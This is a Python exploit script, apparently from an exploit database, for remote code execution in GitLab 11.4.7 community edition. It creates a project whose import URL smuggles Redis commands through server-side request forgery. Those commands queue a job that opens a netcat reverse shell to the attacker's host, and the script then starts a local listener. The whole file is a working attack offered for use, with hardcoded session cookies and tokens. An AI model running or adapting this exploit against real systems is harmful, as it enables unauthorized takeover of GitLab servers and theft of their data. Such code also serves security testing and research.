# Exploit Title: Gitlab 11.4.7 - Remote Code Execution
# Date: 14-12-2020
# Exploit Author: Fortunato Lodari fox [at] thebrain [dot] net, foxlox
# Vendor Homepage: https://about.gitlab.com/
# POC: https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/
# Tested On: Debian 10 + Apache/2.4.46 (Debian)
# Version: 11.4.7 community

import sys
import requests
import time
import random
import http.cookiejar
import os.path
from os import path

# Sign in GitLab 11.4.7  portal and get (using Burp or something other):
# authenticity_token
# authenticated cookies
# username
# specify localport and localip for reverse shell

username='norman1'
authenticity_token='uZUgl6nuhF4xLIWKEj2kdyMMGF/f6rBwqrQfgRP+z0AdkZ33jI5SFalx7KzGW1e69jDlSEYc1eUJSy4rQH6JDA=='
cookie = '_gitlab_session=945b6f8a082fe10f9385d9d6bef4870e; sidebar_collapsed=false'
localport='9999'
localip='http://10.10.14.207'


url = "http://10.10.10.220:5080"
proxies = { "http": "http://localhost:8080" }


def deb(str):
    print("Debug => "+str)

def create_payload(authenticity_token,prgname,namespace_id,localip,localport,username):
    return {'utf8':'✓','authenticity_token':authenticity_token,'project[ci_cd_only]':'false','project[name]':prgname,'project[namespace_id]':namespace_id,'project[path]':prgname,'project[description]':prgname,'project[visibility_level]':'20','':'project[initialize_with_readme]','project[import_url]':'git://[0:0:0:0:0:ffff:127.0.0.1]:6379/\n multi\n sadd resque:gitlab:queues system_hook_push\n lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\'|nc '+localip+' '+localport+' -e /bin/sh\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1513714403.8122594,\\"enqueued_at\\":1513714403.8129568}"\n exec\n exec\n exec\n/'+username+'/'+prgname+'.git'}

import string
def random_string(length):
    return ''.join(random.choice(string.ascii_letters) for m in range(length))

def init(username,cookie,authenticity_token,localport,localip):
    from bs4 import BeautifulSoup
    import re
    import urllib.parse
    deb("Token: "+authenticity_token)
    deb("Cookie: "+cookie)
    session=requests.Session()
    headers = {'user-agent':'Moana Browser 1.0','Cookie':cookie,'Content-Type':'application/x-www-form-urlencoded','DNT':'1','Upgrade-Insecure-Requests':'1'}
    r=session.get(url+'/projects/new',headers=headers,allow_redirects=True)
    soup = BeautifulSoup(r.content,"lxml")
    nsid = soup.findAll('input', {"id": "project_namespace_id"})
    namespace_id=nsid[0]['value'];
    deb("Namespace ID: "+namespace_id)
    prgname=random_string(8)
    newpayload=create_payload(authenticity_token,prgname,namespace_id,localip,localport,username)
    newpayload=urllib.parse.urlencode(newpayload)
    deb("Payload encoded: "+newpayload)
    r=session.post(url+'/projects',newpayload,headers=headers,allow_redirects=False)
    os.system("nc -nvlp "+localport)

init(username,cookie,authenticity_token,localport,localip)